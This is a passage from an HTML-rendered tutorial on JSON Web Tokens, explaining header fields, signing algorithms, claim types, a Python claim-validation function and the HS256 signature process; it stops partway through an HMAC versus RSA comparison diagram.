<a id="__codelineno-2-4" name="__codelineno-2-4" href="#__codelineno-2-4"></a><span class="w">  </span><span class="nt">&quot;kid&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;key-id-123&quot;</span><span class="p">,</span><span class="w">   </span><span class="c1">// Key ID (for key rotation)</span>
<a id="__codelineno-2-5" name="__codelineno-2-5" href="#__codelineno-2-5"></a><span class="w">  </span><span class="nt">&quot;cty&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;JWT&quot;</span><span class="p">,</span><span class="w">          </span><span class="c1">// Content type (for nested JWTs)</span>
<a id="__codelineno-2-6" name="__codelineno-2-6" href="#__codelineno-2-6"></a><span class="w">  </span><span class="nt">&quot;jku&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;https://...&quot;</span><span class="p">,</span><span class="w">  </span><span class="c1">// JWK Set URL</span>
<a id="__codelineno-2-7" name="__codelineno-2-7" href="#__codelineno-2-7"></a><span class="w">  </span><span class="nt">&quot;x5u&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;https://...&quot;</span><span class="p">,</span><span class="w">  </span><span class="c1">// X.509 URL</span>
<a id="__codelineno-2-8" name="__codelineno-2-8" href="#__codelineno-2-8"></a><span class="w">  </span><span class="nt">&quot;x5c&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">[</span><span class="s2">&quot;cert1&quot;</span><span class="p">],</span><span class="w">      </span><span class="c1">// X.509 certificate chain</span>
<a id="__codelineno-2-9" name="__codelineno-2-9" href="#__codelineno-2-9"></a><span class="w">  </span><span class="nt">&quot;x5t&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;thumb...&quot;</span><span class="p">,</span><span class="w">     </span><span class="c1">// X.509 thumbprint (SHA-1)</span>
<a id="__codelineno-2-10" name="__codelineno-2-10" href="#__codelineno-2-10"></a><span class="w">  </span><span class="nt">&quot;x5t#S256&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;...&quot;</span><span class="w">      </span><span class="c1">// X.509 thumbprint (SHA-256)</span>
<a id="__codelineno-2-11" name="__codelineno-2-11" href="#__codelineno-2-11"></a><span class="p">}</span>
</code></pre></div>
<h3 id="common-algorithms">Common Algorithms</h3>
<table>
<thead>
<tr>
<th>Algorithm</th>
<th>Type</th>
<th>Description</th>
<th>Key Length</th>
</tr>
</thead>
<tbody>
<tr>
<td><strong>HS256</strong></td>
<td>HMAC</td>
<td>SHA-256 symmetric signing</td>
<td>256 bits</td>
</tr>
<tr>
<td><strong>HS384</strong></td>
<td>HMAC</td>
<td>SHA-384 symmetric signing</td>
<td>384 bits</td>
</tr>
<tr>
<td><strong>HS512</strong></td>
<td>HMAC</td>
<td>SHA-512 symmetric signing</td>
<td>512 bits</td>
</tr>
<tr>
<td><strong>RS256</strong></td>
<td>RSA</td>
<td>SHA-256 asymmetric signing</td>
<td>2048+ bits</td>
</tr>
<tr>
<td><strong>RS384</strong></td>
<td>RSA</td>
<td>SHA-384 asymmetric signing</td>
<td>2048+ bits</td>
</tr>
<tr>
<td><strong>RS512</strong></td>
<td>RSA</td>
<td>SHA-512 asymmetric signing</td>
<td>2048+ bits</td>
</tr>
<tr>
<td><strong>ES256</strong></td>
<td>ECDSA</td>
<td>SHA-256 with P-256 curve</td>
<td>256 bits</td>
</tr>
<tr>
<td><strong>ES384</strong></td>
<td>ECDSA</td>
<td>SHA-384 with P-384 curve</td>
<td>384 bits</td>
</tr>
<tr>
<td><strong>ES512</strong></td>
<td>ECDSA</td>
<td>SHA-512 with P-521 curve</td>
<td>521 bits</td>
</tr>
<tr>
<td><strong>PS256</strong></td>
<td>RSA-PSS</td>
<td>SHA-256 with MGF1</td>
<td>2048+ bits</td>
</tr>
<tr>
<td><strong>none</strong></td>
<td>None</td>
<td> Unsecured (NOT recommended)</td>
<td>N/A</td>
</tr>
</tbody>
</table>
<hr />
<h2 id="part-2-payload-claims">Part 2: Payload (Claims)</h2>
<p>The payload contains <strong>claims</strong> - statements about an entity (typically the user) and additional metadata.</p>
<h3 id="types-of-claims">Types of Claims</h3>
<div class="highlight"><pre><span></span><code><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a>
<a id="__codelineno-3-2" name="__codelineno-3-2" href="#__codelineno-3-2"></a>                      Claim Types                            
<a id="__codelineno-3-3" name="__codelineno-3-3" href="#__codelineno-3-3"></a>
<a id="__codelineno-3-4" name="__codelineno-3-4" href="#__codelineno-3-4"></a>                                                              
<a id="__codelineno-3-5" name="__codelineno-3-5" href="#__codelineno-3-5"></a>  1. REGISTERED CLAIMS (Reserved, standardized)              
<a id="__codelineno-3-6" name="__codelineno-3-6" href="#__codelineno-3-6"></a>                    
<a id="__codelineno-3-7" name="__codelineno-3-7" href="#__codelineno-3-7"></a>      iss (Issuer)                                          
<a id="__codelineno-3-8" name="__codelineno-3-8" href="#__codelineno-3-8"></a>      sub (Subject)                                         
<a id="__codelineno-3-9" name="__codelineno-3-9" href="#__codelineno-3-9"></a>      aud (Audience)                                        
<a id="__codelineno-3-10" name="__codelineno-3-10" href="#__codelineno-3-10"></a>      exp (Expiration Time)                                 
<a id="__codelineno-3-11" name="__codelineno-3-11" href="#__codelineno-3-11"></a>      nbf (Not Before)                                      
<a id="__codelineno-3-12" name="__codelineno-3-12" href="#__codelineno-3-12"></a>      iat (Issued At)                                       
<a id="__codelineno-3-13" name="__codelineno-3-13" href="#__codelineno-3-13"></a>      jti (JWT ID)                                          
<a id="__codelineno-3-14" name="__codelineno-3-14" href="#__codelineno-3-14"></a>                                                              
<a id="__codelineno-3-15" name="__codelineno-3-15" href="#__codelineno-3-15"></a>  2. PUBLIC CLAIMS (Collision-resistant, should be in IANA)  
<a id="__codelineno-3-16" name="__codelineno-3-16" href="#__codelineno-3-16"></a>                    
<a id="__codelineno-3-17" name="__codelineno-3-17" href="#__codelineno-3-17"></a>      name, email, phone, address, etc.                     
<a id="__codelineno-3-18" name="__codelineno-3-18" href="#__codelineno-3-18"></a>      Should use URIs to avoid collision                    
<a id="__codelineno-3-19" name="__codelineno-3-19" href="#__codelineno-3-19"></a>                                                              
<a id="__codelineno-3-20" name="__codelineno-3-20" href="#__codelineno-3-20"></a>  3. PRIVATE CLAIMS (Custom, application-specific)           
<a id="__codelineno-3-21" name="__codelineno-3-21" href="#__codelineno-3-21"></a>                    
<a id="__codelineno-3-22" name="__codelineno-3-22" href="#__codelineno-3-22"></a>      user_id, role, permissions                            
<a id="__codelineno-3-23" name="__codelineno-3-23" href="#__codelineno-3-23"></a>      organization_id, tenant_id                            
<a id="__codelineno-3-24" name="__codelineno-3-24" href="#__codelineno-3-24"></a>      Any custom data                                       
<a id="__codelineno-3-25" name="__codelineno-3-25" href="#__codelineno-3-25"></a>                                                              
<a id="__codelineno-3-26" name="__codelineno-3-26" href="#__codelineno-3-26"></a>
</code></pre></div>
<h3 id="registered-claims-detailed">Registered Claims (Detailed)</h3>
<div class="highlight"><pre><span></span><code><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a><span class="p">{</span>
<a id="__codelineno-4-2" name="__codelineno-4-2" href="#__codelineno-4-2"></a><span class="w">  </span><span class="c1">// Issuer: Who created and signed the token</span>
<a id="__codelineno-4-3" name="__codelineno-4-3" href="#__codelineno-4-3"></a><span class="w">  </span><span class="nt">&quot;iss&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;https://auth.example.com&quot;</span><span class="p">,</span>
<a id="__codelineno-4-4" name="__codelineno-4-4" href="#__codelineno-4-4"></a>
<a id="__codelineno-4-5" name="__codelineno-4-5" href="#__codelineno-4-5"></a><span class="w">  </span><span class="c1">// Subject: Whom the token refers to (usually user ID)</span>
<a id="__codelineno-4-6" name="__codelineno-4-6" href="#__codelineno-4-6"></a><span class="w">  </span><span class="nt">&quot;sub&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;user123&quot;</span><span class="p">,</span>
<a id="__codelineno-4-7" name="__codelineno-4-7" href="#__codelineno-4-7"></a>
<a id="__codelineno-4-8" name="__codelineno-4-8" href="#__codelineno-4-8"></a><span class="w">  </span><span class="c1">// Audience: Who the token is intended for</span>
<a id="__codelineno-4-9" name="__codelineno-4-9" href="#__codelineno-4-9"></a><span class="w">  </span><span class="nt">&quot;aud&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">[</span><span class="s2">&quot;https://api.example.com&quot;</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;https://app.example.com&quot;</span><span class="p">],</span>
<a id="__codelineno-4-10" name="__codelineno-4-10" href="#__codelineno-4-10"></a>
<a id="__codelineno-4-11" name="__codelineno-4-11" href="#__codelineno-4-11"></a><span class="w">  </span><span class="c1">// Expiration Time: When token expires (Unix timestamp)</span>
<a id="__codelineno-4-12" name="__codelineno-4-12" href="#__codelineno-4-12"></a><span class="w">  </span><span class="nt">&quot;exp&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">1735689600</span><span class="p">,</span><span class="w">  </span><span class="c1">// 2025-01-01 00:00:00 UTC</span>
<a id="__codelineno-4-13" name="__codelineno-4-13" href="#__codelineno-4-13"></a>
<a id="__codelineno-4-14" name="__codelineno-4-14" href="#__codelineno-4-14"></a><span class="w">  </span><span class="c1">// Not Before: Token not valid before this time</span>
<a id="__codelineno-4-15" name="__codelineno-4-15" href="#__codelineno-4-15"></a><span class="w">  </span><span class="nt">&quot;nbf&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">1735603200</span><span class="p">,</span><span class="w">  </span><span class="c1">// 2024-12-31 00:00:00 UTC</span>
<a id="__codelineno-4-16" name="__codelineno-4-16" href="#__codelineno-4-16"></a>
<a id="__codelineno-4-17" name="__codelineno-4-17" href="#__codelineno-4-17"></a><span class="w">  </span><span class="c1">// Issued At: When token was created</span>
<a id="__codelineno-4-18" name="__codelineno-4-18" href="#__codelineno-4-18"></a><span class="w">  </span><span class="nt">&quot;iat&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">1735603200</span><span class="p">,</span><span class="w">  </span><span class="c1">// 2024-12-31 00:00:00 UTC</span>
<a id="__codelineno-4-19" name="__codelineno-4-19" href="#__codelineno-4-19"></a>
<a id="__codelineno-4-20" name="__codelineno-4-20" href="#__codelineno-4-20"></a><span class="w">  </span><span class="c1">// JWT ID: Unique identifier for this token</span>
<a id="__codelineno-4-21" name="__codelineno-4-21" href="#__codelineno-4-21"></a><span class="w">  </span><span class="nt">&quot;jti&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;550e8400-e29b-41d4-a716-446655440000&quot;</span>
<a id="__codelineno-4-22" name="__codelineno-4-22" href="#__codelineno-4-22"></a><span class="p">}</span>
</code></pre></div>
<h3 id="complete-payload-example">Complete Payload Example</h3>
<div class="highlight"><pre><span></span><code><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a><span class="p">{</span>
<a id="__codelineno-5-2" name="__codelineno-5-2" href="#__codelineno-5-2"></a><span class="w">  </span><span class="c1">// Registered claims</span>
<a id="__codelineno-5-3" name="__codelineno-5-3" href="#__codelineno-5-3"></a><span class="w">  </span><span class="nt">&quot;iss&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;https://auth.myapp.com&quot;</span><span class="p">,</span>
<a id="__codelineno-5-4" name="__codelineno-5-4" href="#__codelineno-5-4"></a><span class="w">  </span><span class="nt">&quot;sub&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;user_12345&quot;</span><span class="p">,</span>
<a id="__codelineno-5-5" name="__codelineno-5-5" href="#__codelineno-5-5"></a><span class="w">  </span><span class="nt">&quot;aud&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;https://api.myapp.com&quot;</span><span class="p">,</span>
<a id="__codelineno-5-6" name="__codelineno-5-6" href="#__codelineno-5-6"></a><span class="w">  </span><span class="nt">&quot;exp&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">1735689600</span><span class="p">,</span>
<a id="__codelineno-5-7" name="__codelineno-5-7" href="#__codelineno-5-7"></a><span class="w">  </span><span class="nt">&quot;iat&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">1735603200</span><span class="p">,</span>
<a id="__codelineno-5-8" name="__codelineno-5-8" href="#__codelineno-5-8"></a><span class="w">  </span><span class="nt">&quot;jti&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;abc-123-xyz&quot;</span><span class="p">,</span>
<a id="__codelineno-5-9" name="__codelineno-5-9" href="#__codelineno-5-9"></a>
<a id="__codelineno-5-10" name="__codelineno-5-10" href="#__codelineno-5-10"></a><span class="w">  </span><span class="c1">// Public claims</span>
<a id="__codelineno-5-11" name="__codelineno-5-11" href="#__codelineno-5-11"></a><span class="w">  </span><span class="nt">&quot;name&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;John Doe&quot;</span><span class="p">,</span>
<a id="__codelineno-5-12" name="__codelineno-5-12" href="#__codelineno-5-12"></a><span class="w">  </span><span class="nt">&quot;email&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;john@example.com&quot;</span><span class="p">,</span>
<a id="__codelineno-5-13" name="__codelineno-5-13" href="#__codelineno-5-13"></a><span class="w">  </span><span class="nt">&quot;email_verified&quot;</span><span class="p">:</span><span class="w"> </span><span class="kc">true</span><span class="p">,</span>
<a id="__codelineno-5-14" name="__codelineno-5-14" href="#__codelineno-5-14"></a><span class="w">  </span><span class="nt">&quot;phone_number&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;+1234567890&quot;</span><span class="p">,</span>
<a id="__codelineno-5-15" name="__codelineno-5-15" href="#__codelineno-5-15"></a><span class="w">  </span><span class="nt">&quot;picture&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;https://example.com/photo.jpg&quot;</span><span class="p">,</span>
<a id="__codelineno-5-16" name="__codelineno-5-16" href="#__codelineno-5-16"></a>
<a id="__codelineno-5-17" name="__codelineno-5-17" href="#__codelineno-5-17"></a><span class="w">  </span><span class="c1">// Private claims</span>
<a id="__codelineno-5-18" name="__codelineno-5-18" href="#__codelineno-5-18"></a><span class="w">  </span><span class="nt">&quot;user_id&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">12345</span><span class="p">,</span>
<a id="__codelineno-5-19" name="__codelineno-5-19" href="#__codelineno-5-19"></a><span class="w">  </span><span class="nt">&quot;role&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;admin&quot;</span><span class="p">,</span>
<a id="__codelineno-5-20" name="__codelineno-5-20" href="#__codelineno-5-20"></a><span class="w">  </span><span class="nt">&quot;permissions&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">[</span><span class="s2">&quot;read&quot;</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;write&quot;</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;delete&quot;</span><span class="p">],</span>
<a id="__codelineno-5-21" name="__codelineno-5-21" href="#__codelineno-5-21"></a><span class="w">  </span><span class="nt">&quot;organization_id&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;org_789&quot;</span><span class="p">,</span>
<a id="__codelineno-5-22" name="__codelineno-5-22" href="#__codelineno-5-22"></a><span class="w">  </span><span class="nt">&quot;department&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;Engineering&quot;</span><span class="p">,</span>
<a id="__codelineno-5-23" name="__codelineno-5-23" href="#__codelineno-5-23"></a><span class="w">  </span><span class="nt">&quot;subscription_tier&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;premium&quot;</span>
<a id="__codelineno-5-24" name="__codelineno-5-24" href="#__codelineno-5-24"></a><span class="p">}</span>
</code></pre></div>
<h3 id="claim-validation-rules">Claim Validation Rules</h3>
<div class="highlight"><pre><span></span><code><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a><span class="k">def</span><span class="w"> </span><span class="nf">validate_claims</span><span class="p">(</span><span class="n">payload</span><span class="p">,</span> <span class="n">config</span><span class="p">):</span>
<a id="__codelineno-6-2" name="__codelineno-6-2" href="#__codelineno-6-2"></a><span class="w">    </span><span class="sd">&quot;&quot;&quot;Validate JWT claims&quot;&quot;&quot;</span>
<a id="__codelineno-6-3" name="__codelineno-6-3" href="#__codelineno-6-3"></a>    <span class="n">now</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">time</span><span class="o">.</span><span class="n">time</span><span class="p">())</span>
<a id="__codelineno-6-4" name="__codelineno-6-4" href="#__codelineno-6-4"></a>
<a id="__codelineno-6-5" name="__codelineno-6-5" href="#__codelineno-6-5"></a>    <span class="c1"># 1. Expiration Time (exp)</span>
<a id="__codelineno-6-6" name="__codelineno-6-6" href="#__codelineno-6-6"></a>    <span class="k">if</span> <span class="s1">&#39;exp&#39;</span> <span class="ow">in</span> <span class="n">payload</span><span class="p">:</span>
<a id="__codelineno-6-7" name="__codelineno-6-7" href="#__codelineno-6-7"></a>        <span class="k">if</span> <span class="n">payload</span><span class="p">[</span><span class="s1">&#39;exp&#39;</span><span class="p">]</span> <span class="o">&lt;</span> <span class="n">now</span><span class="p">:</span>
<a id="__codelineno-6-8" name="__codelineno-6-8" href="#__codelineno-6-8"></a>            <span class="k">raise</span> <span class="ne">ValueError</span><span class="p">(</span><span class="s2">&quot;Token has expired&quot;</span><span class="p">)</span>
<a id="__codelineno-6-9" name="__codelineno-6-9" href="#__codelineno-6-9"></a>
<a id="__codelineno-6-10" name="__codelineno-6-10" href="#__codelineno-6-10"></a>    <span class="c1"># 2. Not Before (nbf)</span>
<a id="__codelineno-6-11" name="__codelineno-6-11" href="#__codelineno-6-11"></a>    <span class="k">if</span> <span class="s1">&#39;nbf&#39;</span> <span class="ow">in</span> <span class="n">payload</span><span class="p">:</span>
<a id="__codelineno-6-12" name="__codelineno-6-12" href="#__codelineno-6-12"></a>        <span class="k">if</span> <span class="n">payload</span><span class="p">[</span><span class="s1">&#39;nbf&#39;</span><span class="p">]</span> <span class="o">&gt;</span> <span class="n">now</span><span class="p">:</span>
<a id="__codelineno-6-13" name="__codelineno-6-13" href="#__codelineno-6-13"></a>            <span class="k">raise</span> <span class="ne">ValueError</span><span class="p">(</span><span class="s2">&quot;Token not yet valid&quot;</span><span class="p">)</span>
<a id="__codelineno-6-14" name="__codelineno-6-14" href="#__codelineno-6-14"></a>
<a id="__codelineno-6-15" name="__codelineno-6-15" href="#__codelineno-6-15"></a>    <span class="c1"># 3. Issuer (iss)</span>
<a id="__codelineno-6-16" name="__codelineno-6-16" href="#__codelineno-6-16"></a>    <span class="k">if</span> <span class="s1">&#39;iss&#39;</span> <span class="ow">in</span> <span class="n">payload</span><span class="p">:</span>
<a id="__codelineno-6-17" name="__codelineno-6-17" href="#__codelineno-6-17"></a>        <span class="k">if</span> <span class="n">payload</span><span class="p">[</span><span class="s1">&#39;iss&#39;</span><span class="p">]</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">config</span><span class="p">[</span><span class="s1">&#39;allowed_issuers&#39;</span><span class="p">]:</span>
<a id="__codelineno-6-18" name="__codelineno-6-18" href="#__codelineno-6-18"></a>            <span class="k">raise</span> <span class="ne">ValueError</span><span class="p">(</span><span class="s2">&quot;Invalid issuer&quot;</span><span class="p">)</span>
<a id="__codelineno-6-19" name="__codelineno-6-19" href="#__codelineno-6-19"></a>
<a id="__codelineno-6-20" name="__codelineno-6-20" href="#__codelineno-6-20"></a>    <span class="c1"># 4. Audience (aud)</span>
<a id="__codelineno-6-21" name="__codelineno-6-21" href="#__codelineno-6-21"></a>    <span class="k">if</span> <span class="s1">&#39;aud&#39;</span> <span class="ow">in</span> <span class="n">payload</span><span class="p">:</span>
<a id="__codelineno-6-22" name="__codelineno-6-22" href="#__codelineno-6-22"></a>        <span class="n">audiences</span> <span class="o">=</span> <span class="n">payload</span><span class="p">[</span><span class="s1">&#39;aud&#39;</span><span class="p">]</span> <span class="k">if</span> <span class="nb">isinstance</span><span class="p">(</span><span class="n">payload</span><span class="p">[</span><span class="s1">&#39;aud&#39;</span><span class="p">],</span> <span class="nb">list</span><span class="p">)</span> <span class="k">else</span> <span class="p">[</span><span class="n">payload</span><span class="p">[</span><span class="s1">&#39;aud&#39;</span><span class="p">]]</span>
<a id="__codelineno-6-23" name="__codelineno-6-23" href="#__codelineno-6-23"></a>        <span class="k">if</span> <span class="n">config</span><span class="p">[</span><span class="s1">&#39;expected_audience&#39;</span><span class="p">]</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">audiences</span><span class="p">:</span>
<a id="__codelineno-6-24" name="__codelineno-6-24" href="#__codelineno-6-24"></a>            <span class="k">raise</span> <span class="ne">ValueError</span><span class="p">(</span><span class="s2">&quot;Invalid audience&quot;</span><span class="p">)</span>
<a id="__codelineno-6-25" name="__codelineno-6-25" href="#__codelineno-6-25"></a>
<a id="__codelineno-6-26" name="__codelineno-6-26" href="#__codelineno-6-26"></a>    <span class="c1"># 5. Issued At (iat) - check if too old</span>
<a id="__codelineno-6-27" name="__codelineno-6-27" href="#__codelineno-6-27"></a>    <span class="k">if</span> <span class="s1">&#39;iat&#39;</span> <span class="ow">in</span> <span class="n">payload</span><span class="p">:</span>
<a id="__codelineno-6-28" name="__codelineno-6-28" href="#__codelineno-6-28"></a>        <span class="n">max_age</span> <span class="o">=</span> <span class="n">config</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;max_token_age&#39;</span><span class="p">,</span> <span class="mi">86400</span><span class="p">)</span>  <span class="c1"># 24 hours</span>
<a id="__codelineno-6-29" name="__codelineno-6-29" href="#__codelineno-6-29"></a>        <span class="k">if</span> <span class="p">(</span><span class="n">now</span> <span class="o">-</span> <span class="n">payload</span><span class="p">[</span><span class="s1">&#39;iat&#39;</span><span class="p">])</span> <span class="o">&gt;</span> <span class="n">max_age</span><span class="p">:</span>
<a id="__codelineno-6-30" name="__codelineno-6-30" href="#__codelineno-6-30"></a>            <span class="k">raise</span> <span class="ne">ValueError</span><span class="p">(</span><span class="s2">&quot;Token too old&quot;</span><span class="p">)</span>
<a id="__codelineno-6-31" name="__codelineno-6-31" href="#__codelineno-6-31"></a>
<a id="__codelineno-6-32" name="__codelineno-6-32" href="#__codelineno-6-32"></a>    <span class="k">return</span> <span class="kc">True</span>
</code></pre></div>
<hr />
<h2 id="part-3-signature">Part 3: Signature</h2>
<p>The signature ensures the token hasn't been tampered with. It's created by encoding the header and payload, then signing with a secret or private key.</p>
<h3 id="signature-creation-process">Signature Creation Process</h3>
<div class="highlight"><pre><span></span><code><a id="__codelineno-7-1" name="__codelineno-7-1" href="#__codelineno-7-1"></a>
<a id="__codelineno-7-2" name="__codelineno-7-2" href="#__codelineno-7-2"></a>             Signature Creation (HS256)                      
<a id="__codelineno-7-3" name="__codelineno-7-3" href="#__codelineno-7-3"></a>
<a id="__codelineno-7-4" name="__codelineno-7-4" href="#__codelineno-7-4"></a>                                                              
<a id="__codelineno-7-5" name="__codelineno-7-5" href="#__codelineno-7-5"></a>  Step 1: Encode Header                                      
<a id="__codelineno-7-6" name="__codelineno-7-6" href="#__codelineno-7-6"></a>                                       
<a id="__codelineno-7-7" name="__codelineno-7-7" href="#__codelineno-7-7"></a>  Header JSON  Base64URL Encode                             
<a id="__codelineno-7-8" name="__codelineno-7-8" href="#__codelineno-7-8"></a>  {&quot;alg&quot;:&quot;HS256&quot;,&quot;typ&quot;:&quot;JWT&quot;}                                
<a id="__codelineno-7-9" name="__codelineno-7-9" href="#__codelineno-7-9"></a>                                                             
<a id="__codelineno-7-10" name="__codelineno-7-10" href="#__codelineno-7-10"></a>  eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9                       
<a id="__codelineno-7-11" name="__codelineno-7-11" href="#__codelineno-7-11"></a>                                                              
<a id="__codelineno-7-12" name="__codelineno-7-12" href="#__codelineno-7-12"></a>  Step 2: Encode Payload                                     
<a id="__codelineno-7-13" name="__codelineno-7-13" href="#__codelineno-7-13"></a>                                      
<a id="__codelineno-7-14" name="__codelineno-7-14" href="#__codelineno-7-14"></a>  Payload JSON  Base64URL Encode                            
<a id="__codelineno-7-15" name="__codelineno-7-15" href="#__codelineno-7-15"></a>  {&quot;sub&quot;:&quot;123&quot;,&quot;name&quot;:&quot;John&quot;}                                
<a id="__codelineno-7-16" name="__codelineno-7-16" href="#__codelineno-7-16"></a>                                                             
<a id="__codelineno-7-17" name="__codelineno-7-17" href="#__codelineno-7-17"></a>  eyJzdWIiOiIxMjMiLCJuYW1lIjoiSm9obiJ9                       
<a id="__codelineno-7-18" name="__codelineno-7-18" href="#__codelineno-7-18"></a>                                                              
<a id="__codelineno-7-19" name="__codelineno-7-19" href="#__codelineno-7-19"></a>  Step 3: Create Signature Input                             
<a id="__codelineno-7-20" name="__codelineno-7-20" href="#__codelineno-7-20"></a>                               
<a id="__codelineno-7-21" name="__codelineno-7-21" href="#__codelineno-7-21"></a>  encodedHeader + &quot;.&quot; + encodedPayload                       
<a id="__codelineno-7-22" name="__codelineno-7-22" href="#__codelineno-7-22"></a>                                                             
<a id="__codelineno-7-23" name="__codelineno-7-23" href="#__codelineno-7-23"></a>  eyJhbGci...J9.eyJzdWIi...obiJ9                             
<a id="__codelineno-7-24" name="__codelineno-7-24" href="#__codelineno-7-24"></a>                                                              
<a id="__codelineno-7-25" name="__codelineno-7-25" href="#__codelineno-7-25"></a>  Step 4: Sign with Secret                                   
<a id="__codelineno-7-26" name="__codelineno-7-26" href="#__codelineno-7-26"></a>                                    
<a id="__codelineno-7-27" name="__codelineno-7-27" href="#__codelineno-7-27"></a>  HMAC-SHA256(signatureInput, secret)                        
<a id="__codelineno-7-28" name="__codelineno-7-28" href="#__codelineno-7-28"></a>                                                             
<a id="__codelineno-7-29" name="__codelineno-7-29" href="#__codelineno-7-29"></a>  Raw signature bytes                                         
<a id="__codelineno-7-30" name="__codelineno-7-30" href="#__codelineno-7-30"></a>                                                              
<a id="__codelineno-7-31" name="__codelineno-7-31" href="#__codelineno-7-31"></a>  Step 5: Base64URL Encode Signature                         
<a id="__codelineno-7-32" name="__codelineno-7-32" href="#__codelineno-7-32"></a>                          
<a id="__codelineno-7-33" name="__codelineno-7-33" href="#__codelineno-7-33"></a>  Signature bytes  Base64URL Encode                         
<a id="__codelineno-7-34" name="__codelineno-7-34" href="#__codelineno-7-34"></a>                                                             
<a id="__codelineno-7-35" name="__codelineno-7-35" href="#__codelineno-7-35"></a>  SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c                
<a id="__codelineno-7-36" name="__codelineno-7-36" href="#__codelineno-7-36"></a>                                                              
<a id="__codelineno-7-37" name="__codelineno-7-37" href="#__codelineno-7-37"></a>  Final JWT:                                                  
<a id="__codelineno-7-38" name="__codelineno-7-38" href="#__codelineno-7-38"></a>  eyJhbGci...J9.eyJzdWIi...obiJ9.SflKxw...dQssw5c            
<a id="__codelineno-7-39" name="__codelineno-7-39" href="#__codelineno-7-39"></a>                                                              
<a id="__codelineno-7-40" name="__codelineno-7-40" href="#__codelineno-7-40"></a>
</code></pre></div>
<h3 id="hmac-vs-rsa-signatures">HMAC vs RSA Signatures</h3>
<div class="highlight"><pre><span></span><code><a id="__codelineno-8-1" name="__codelineno-8-1" href="#__codelineno-8-1"></a>
<a id="__codelineno-8-2" name="__codelineno-8-2" href="#__codelineno-8-2"></a>             HMAC (Symmetric) - HS256                         
<a id="__codelineno-8-3" name="__codelineno-8-3" href="#__codelineno-8-3"></a>
<a id="__codelineno-8-4" name="__codelineno-8-4" href="#__codelineno-8-4"></a>                                                               
<a id="__codelineno-8-5" name="__codelineno-8-5" href="#__codelineno-8-5"></a>  Same secret key for signing AND verifying                   
<a id="__codelineno-8-6" name="__codelineno-8-6" href="#__codelineno-8-6"></a>                                                               
<a id="__codelineno-8-7" name="__codelineno-8-7" href="#__codelineno-8-7"></a>        Secret Key: &quot;mySecret123&quot;            
<a id="__codelineno-8-8" name="__codelineno-8-8" href="#__codelineno-8-8"></a>     Issuer                                                 
<a id="__codelineno-8-9" name="__codelineno-8-9" href="#__codelineno-8-9"></a>   (Auth Server)      HMAC-SHA256(data, secret)            
<a id="__codelineno-8-10" name="__codelineno-8-10" href="#__codelineno-8-10"></a>                                             
<a id="__codelineno-8-11" name="__codelineno-8-11" href="#__codelineno-8-11"></a>                           Signature                          
<a id="__codelineno-8-12" name="__codelineno-8-12" href="#__codelineno-8-12"></a>          Creates JWT                                        
<a id="__codelineno-8-13" name="__codelineno-8-13" href="#__codelineno-8-13"></a>                                                              
<a id="__codelineno-8-14" name="__codelineno-8-14" href="#__codelineno-8-14"></a>  eyJhbGci...SflKxwRJ                                         
<a id="__codelineno-8-15" name="__codelineno-8-15" href="#__codelineno-8-15"></a>                                                              
<a id="__codelineno-8-16" name="__codelineno-8-16" href="#__codelineno-8-16"></a>          Sends JWT                                          
<a id="__codelineno-8-17" name="__codelineno-8-17" href="#__codelineno-8-17"></a>                                                              
<a id="__codelineno-8-18" name="__codelineno-8-18" href="#__codelineno-8-18"></a>        Secret Key: &quot;mySecret123&quot;            
<a id="__codelineno-8-19" name="__codelineno-8-19" href="#__codelineno-8-19"></a>     Verifier                                               
<a id="__codelineno-8-20" name="__codelineno-8-20" href="#__codelineno-8-20"></a>   (API Server)       HMAC-SHA256(data, secret)            
<a id="__codelineno-8-21" name="__codelineno-8-21" href="#__codelineno-8-21"></a>                                             
<a id="__codelineno-8-22" name="__codelineno-8-22" href="#__codelineno-8-22"></a>                            Verify matches                     
<a id="__codelineno-8-23" name="__codelineno-8-23" href="#__codelineno-8-23"></a>                                                               
